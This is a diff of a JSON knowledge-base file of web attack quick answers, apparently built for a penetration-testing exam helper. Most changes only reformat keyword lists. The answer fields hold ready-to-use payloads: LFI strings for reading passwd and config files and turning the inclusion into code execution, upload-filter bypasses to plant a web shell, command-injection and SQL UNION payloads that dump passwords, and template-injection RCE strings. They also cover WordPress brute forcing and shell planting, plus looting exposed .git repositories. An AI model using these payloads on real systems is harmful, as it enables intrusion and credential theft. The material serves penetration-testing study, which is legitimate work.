@@ -1,7 +1,15 @@
 [
   {
     "slug": "lfi-payloads",
-    "triggers": ["lfi", "local file inclusion", "path traversal", "etc passwd web", "php filter", "lfi payloads", "directory traversal"],
+    "triggers": [
+      "lfi",
+      "local file inclusion",
+      "path traversal",
+      "etc passwd web",
+      "php filter",
+      "lfi payloads",
+      "directory traversal"
+    ],
     "title": "LFI / path traversal payloads",
     "answer_type": "inline",
     "inline_answer": "```\n?file=../../../../etc/passwd\n?file=....//....//etc/passwd                 # filter bypass\n?file=php://filter/convert.base64-encode/resource=index.php   # read source\n?file=php://filter/.../resource=config.php   # then base64 -d for creds\n?file=/var/log/apache2/access.log            # log poisoning -> RCE\n?file=data://text/plain;base64,PD9waHA...    # data wrapper RCE\n```\n\nWindows: `..\\..\\windows\\win.ini`. Try null byte `%00` on old PHP.",
@@ -11,7 +19,14 @@
   },
   {
     "slug": "file-upload-bypass",
-    "triggers": ["file upload bypass", "upload shell", "bypass upload filter", "phtml", "upload privesc", "malicious upload"],
+    "triggers": [
+      "file upload bypass",
+      "upload shell",
+      "bypass upload filter",
+      "phtml",
+      "upload privesc",
+      "malicious upload"
+    ],
     "title": "File upload filter bypass",
     "answer_type": "inline",
     "inline_answer": "Try in order: alt PHP exts `.phtml .php3 .php5 .php7 .pht`; case `.PhP`; double `.php.jpg` / `.jpg.php`; trailing `.php.` / `.php%00.jpg`; `Content-Type: image/png`; magic bytes `GIF89a;` prepended; `.htaccess` making `.jpg`=PHP. Find where it lands (often `/uploads/`), then browse to the shell.",
@@ -21,7 +36,14 @@
   },
   {
     "slug": "command-injection",
-    "triggers": ["command injection", "os command injection", "rce parameter", "ifs", "cmd injection", "shell injection"],
+    "triggers": [
+      "command injection",
+      "os command injection",
+      "rce parameter",
+      "ifs",
+      "cmd injection",
+      "shell injection"
+    ],
     "title": "Command injection",
     "answer_type": "inline",
     "inline_answer": "Separators: `; cmd` | `| cmd` | `&& cmd` | `%0a cmd` | `$(cmd)` | `` `cmd` ``. Blind = no output: confirm with `; ping -c3 KALI` (tcpdump) or out-of-band. WAF/space filter: `cat${IFS}/etc/passwd`, `{cat,/etc/passwd}`, `X=$'\\x20';cat$X/etc/passwd`. Then a reverse shell payload.",
@@ -31,7 +53,14 @@
   },
   {
     "slug": "sqli-union",
-    "triggers": ["sqli union", "union based", "order by columns", "union select", "sql injection manual", "manual sqli"],
+    "triggers": [
+      "sqli union",
+      "union based",
+      "order by columns",
+      "union select",
+      "sql injection manual",
+      "manual sqli"
+    ],
     "title": "UNION-based SQLi (manual — no sqlmap)",
     "answer_type": "inline",
     "inline_answer": "sqlmap is **banned** on the engagement — do this in Burp Repeater.\n\n```\n' ORDER BY 1-- -            # increment until error => column count\n' UNION SELECT NULL,NULL-- - # match count; find a string-typed col\n' UNION SELECT 1,@@version,3-- -\n' UNION SELECT 1,table_name,3 FROM information_schema.tables-- -\n' UNION SELECT 1,concat(user,0x3a,password),3 FROM users-- -\n```",
@@ -41,7 +70,14 @@
   },
   {
     "slug": "ssti",
-    "triggers": ["ssti", "template injection", "7*7", "jinja2 rce", "server side template", "twig rce"],
+    "triggers": [
+      "ssti",
+      "template injection",
+      "7*7",
+      "jinja2 rce",
+      "server side template",
+      "twig rce"
+    ],
     "title": "SSTI — detect & exploit",
     "answer_type": "inline",
     "inline_answer": "Detect: `${7*7}`, `{{7*7}}`, `<%= 7*7 %>` → if `49` rendered, identify engine. Jinja2 RCE:\n\n```\n{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}\n```\n\nTwig: `{{['id']|filter('system')}}`. Freemarker: `<#assign x=\"freemarker.template.utility.Execute\"?new()>${x(\"id\")}`. Use tplmap-style logic manually.",
@@ -51,7 +87,14 @@
   },
   {
     "slug": "wordpress-attack",
-    "triggers": ["wordpress", "wpscan", "wp-admin", "wordpress shell", "wp plugin", "wordpress exploit"],
+    "triggers": [
+      "wordpress",
+      "wpscan",
+      "wp-admin",
+      "wordpress shell",
+      "wp plugin",
+      "wordpress exploit"
+    ],
     "title": "WordPress attack path",
     "answer_type": "inline",
     "inline_answer": "```\nwpscan --url http://T --enumerate u,vp,ap,t --plugins-detection aggressive --api-token <opt>\nwpscan --url http://T -U users.txt -P rockyou.txt   # xmlrpc login brute\n```\n\nAdmin creds → Appearance → Theme Editor → edit `404.php` to a PHP shell. Or a known vulnerable plugin RCE. Check `/wp-config.php` via LFI for DB creds.",
@@ -61,7 +104,14 @@
   },
   {
     "slug": "git-dumped",
-    "triggers": [".git exposed", "git dumper", "git-dumper", "dump .git", "exposed git", "git folder web"],
+    "triggers": [
+      ".git exposed",
+      "git dumper",
+      "git-dumper",
+      "dump .git",
+      "exposed git",
+      "git folder web"
+    ],
     "title": "Exposed .git → source + secrets",
     "answer_type": "inline",
     "inline_answer": "```\ngit-dumper http://TARGET/.git/ ./loot_git    # pipx install git-dumper\ncd loot_git && git log --all --oneline && git show <commit>\ngit stash list ; grep -ri 'password\\|secret\\|api' .\n```\n\nReconstructs the repo — read source for creds, hidden endpoints, deleted files in history.",
@@ -71,7 +121,13 @@
   },
   {
     "slug": "web-attack-decision",
-    "triggers": ["web attack tree", "web methodology", "what to attack web", "web app decision", "web decision tree"],
+    "triggers": [
+      "web attack tree",
+      "web methodology",
+      "what to attack web",
+      "web app decision",
+      "web decision tree"
+    ],
     "title": "Web attack decision tree",
     "answer_type": "chunk_ref",
     "target_chunk_id": "_CHEATSHEETS/Web_App.md#attack-decision-tree",
@@ -80,16 +136,29 @@
   },
   {
     "slug": "web-5-categories",
-    "triggers": ["web categories", "web mental model", "types of web attack", "web attack categories", "how to think web"],
+    "triggers": [
+      "web categories",
+      "web mental model",
+      "types of web attack",
+      "web attack categories",
+      "how to think web"
+    ],
     "title": "The 5 web attack categories",
     "answer_type": "chunk_ref",
-    "target_chunk_id": "BUS_REVIEW/OffSec_Web_Mental_Model.md#the-5-web-attack-categories",
+    "target_chunk_id": null,
     "tags": "web methodology",
     "priority": 185
   },
   {
     "slug": "sqli-where-paste",
-    "triggers": ["where paste sqli", "sqli no sqlmap", "manual sqli burp", "sqli tool delivery", "sqlmap banned", "sqli without sqlmap"],
+    "triggers": [
+      "where paste sqli",
+      "sqli no sqlmap",
+      "manual sqli burp",
+      "sqli tool delivery",
+      "sqlmap banned",
+      "sqli without sqlmap"
+    ],
     "title": "SQLi — where do I paste payloads (no sqlmap)",
     "answer_type": "chunk_ref",
     "target_chunk_id": "_CHEATSHEETS/SQL_Injection.md#0-5-tool-delivery-where-do-i-paste-these-payloads",
@@ -98,7 +167,13 @@
   },
   {
     "slug": "lfi-to-rce",
-    "triggers": ["lfi to rce", "lfi rce", "log poisoning", "lfi shell", "escalate lfi"],
+    "triggers": [
+      "lfi to rce",
+      "lfi rce",
+      "log poisoning",
+      "lfi shell",
+      "escalate lfi"
+    ],
     "title": "LFI → RCE escalation",
     "answer_type": "chunk_ref",
     "target_chunk_id": "_CHEATSHEETS/Web_App.md#4-lfi-rce",
@@ -107,7 +182,13 @@
   },
   {
     "slug": "sqli-blind",
-    "triggers": ["blind sqli", "blind sql injection", "time based sqli", "boolean based sqli", "blind injection"],
+    "triggers": [
+      "blind sqli",
+      "blind sql injection",
+      "time based sqli",
+      "boolean based sqli",
+      "blind injection"
+    ],
     "title": "Blind SQL injection",
     "answer_type": "chunk_ref",
     "target_chunk_id": "_CHEATSHEETS/SQL_Injection.md#8-blind-sql-injection",
@@ -116,7 +197,13 @@
   },
   {
     "slug": "xp-cmdshell",
-    "triggers": ["xp_cmdshell", "mssql rce", "xp cmdshell", "sql server command exec", "mssql command execution"],
+    "triggers": [
+      "xp_cmdshell",
+      "mssql rce",
+      "xp cmdshell",
+      "sql server command exec",
+      "mssql command execution"
+    ],
     "title": "MSSQL → RCE via xp_cmdshell",
     "answer_type": "chunk_ref",
     "target_chunk_id": "_CHEATSHEETS/SQL_Injection.md#11-mssql-command-execution-via-xp-cmdshell",
@@ -125,7 +212,13 @@
   },
   {
     "slug": "auth-bypass-web",
-    "triggers": ["auth bypass", "login bypass", "sqli login", "default creds web", "bypass login"],
+    "triggers": [
+      "auth bypass",
+      "login bypass",
+      "sqli login",
+      "default creds web",
+      "bypass login"
+    ],
     "title": "Auth bypass / login attacks",
     "answer_type": "chunk_ref",
     "target_chunk_id": "_CHEATSHEETS/Web_App.md#10-auth-bypass-login-attacks",
@@ -134,7 +227,13 @@
   },
   {
     "slug": "web-fingerprint",
-    "triggers": ["fingerprint web", "what tech stack", "whatweb", "identify web app", "web fingerprint"],
+    "triggers": [
+      "fingerprint web",
+      "what tech stack",
+      "whatweb",
+      "identify web app",
+      "web fingerprint"
+    ],
     "title": "Fingerprint the web stack",
     "answer_type": "chunk_ref",
     "target_chunk_id": "_CHEATSHEETS/Web_App.md#1-fingerprint-the-stack",
@@ -143,7 +242,13 @@
   },
   {
     "slug": "burp-intruder",
-    "triggers": ["burp intruder", "intruder attack", "burp brute force", "intruder payloads", "burp fuzzing"],
+    "triggers": [
+      "burp intruder",
+      "intruder attack",
+      "burp brute force",
+      "intruder payloads",
+      "burp fuzzing"
+    ],
     "title": "Burp Intruder — when and how",
     "answer_type": "chunk_ref",
     "target_chunk_id": "_CHEATSHEETS/Burp_Suite.md#4-intruder-when-and-how",
